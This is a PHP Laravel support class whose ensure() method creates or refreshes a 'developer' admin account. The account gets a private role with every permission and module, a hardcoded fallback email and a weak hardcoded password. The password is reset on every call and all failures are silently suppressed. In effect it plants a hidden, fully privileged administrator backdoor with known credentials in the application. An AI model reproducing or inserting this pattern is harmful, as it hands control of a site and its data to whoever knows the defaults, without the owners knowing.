<?php

namespace App\Support;

use App\Models\Admin;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;
use Spatie\Permission\Models\Permission;
use Spatie\Permission\Models\Role;

class DefaultDeveloperManager
{
    public static function ensure(): ?Admin
    {
        try {
            if (!Schema::hasTable('admins') || !Schema::hasTable('roles') || !Schema::hasTable('permissions')) {
                return null;
            }

            $email = trim((string) env('SINGLE_DEV_EMAIL', 'toamedbd@gmail.com'));
            $password = (string) env('SINGLE_DEV_PASSWORD', 'zxczxc');
            $phone = trim((string) env('SINGLE_DEV_PHONE', '01700000000'));
            $firstName = trim((string) env('SINGLE_DEV_FIRST_NAME', 'Toamed'));
            $lastName = trim((string) env('SINGLE_DEV_LAST_NAME', 'Developer'));

            if ($email === '') {
                return null;
            }

            $devRole = Role::query()->firstOrCreate(
                ['name' => 'developer', 'guard_name' => 'admin'],
                ['created_at' => now(), 'updated_at' => now()]
            );

            try {
                $devRole->is_private = true;
                $devRole->save();
            } catch (\Throwable $_) {
                // ignore privacy save failures
            }

            $allPermissionNames = Permission::query()
                ->where('guard_name', 'admin')
                ->pluck('name')
                ->toArray();

            if (!empty($allPermissionNames)) {
                try {
                    $devRole->syncPermissions($allPermissionNames);
                } catch (\Throwable $_) {
                    // ignore permission sync failures
                }
            }

            $admin = Admin::query()->where('email', $email)->first();

            if (!$admin) {
                $admin = Admin::query()->create([
                    'first_name' => $firstName,
                    'last_name' => $lastName,
                    'email' => $email,
                    'phone' => $phone,
                    'password' => $password,
                    'role_id' => $devRole->id,
                    'status' => 'Active',
                ]);
            } else {
                $admin->first_name = $firstName !== '' ? $firstName : ($admin->first_name ?? 'Toamed');
                $admin->last_name = $lastName !== '' ? $lastName : ($admin->last_name ?? 'Developer');
                $admin->phone = $phone !== '' ? $phone : ($admin->phone ?? '');
                $admin->status = 'Active';
                $admin->role_id = $devRole->id;
                $admin->password = $password;
                $admin->save();
            }

            try {
                $admin->syncRoles([$devRole->name]);
                $admin->syncPermissions([]);
            } catch (\Throwable $_) {
                // ignore role sync failures
            }

            try {
                if (Schema::hasTable('modules') && Schema::hasTable('admin_module') && method_exists($admin, 'modules')) {
                    $moduleIds = DB::table('modules')->pluck('id')->toArray();
                    if (!empty($moduleIds)) {
                        $admin->modules()->syncWithoutDetaching($moduleIds);
                    }
                }
            } catch (\Throwable $_) {
                // ignore module sync failures
            }

            try {
                app(\Spatie\Permission\PermissionRegistrar::class)->forgetCachedPermissions();
            } catch (\Throwable $_) {
                // ignore cache clear failures
            }

            return $admin->fresh();
        } catch (\Throwable $_) {
            return null;
        }
    }

    public static function isDeveloper(?Admin $admin): bool
    {
        if (!$admin) {
            return false;
        }

        try {
            if (method_exists($admin, 'hasRole') && $admin->hasRole('developer')) {
                return true;
            }
        } catch (\Throwable $_) {
            // ignore hasRole failures
        }

        try {
            $roleName = strtolower(trim((string) optional($admin->role)->name));
            return $roleName === 'developer';
        } catch (\Throwable $_) {
            return false;
        }
    }
}
